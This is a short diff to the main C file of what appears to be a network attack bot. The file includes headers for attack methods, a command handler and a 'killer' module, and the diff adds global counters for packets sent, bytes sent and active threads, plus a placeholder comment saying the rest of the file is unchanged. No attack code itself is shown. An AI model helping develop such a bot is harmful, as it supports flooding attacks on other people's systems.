@@ -1,5 +1,5 @@
 #include "bot.h"
-#include "attack_methods.h"
+#include "attack_methods.h"  // Add this include
 #include "command_handler.h"
 #include "ascii_art.h"
 #include "killer.h"
@@ -31,6 +31,12 @@ volatile long long total_attacks = 0;
 volatile long long total_packets = 0;
 volatile long long total_bytes = 0;
 
+// Attack statistics (defined here for attack_methods.c to use via extern)
+volatile long long total_packets_sent = 0;
+volatile long long total_bytes_sent = 0;
+volatile int active_threads = 0;
+
+// Rest of bot.c code remains the same...
 void signal_handler(int sig) {
     (void)sig; // Silence unused parameter warning
     printf("\n\033[1;33m[*] Received shutdown signal...\033[0m\n");
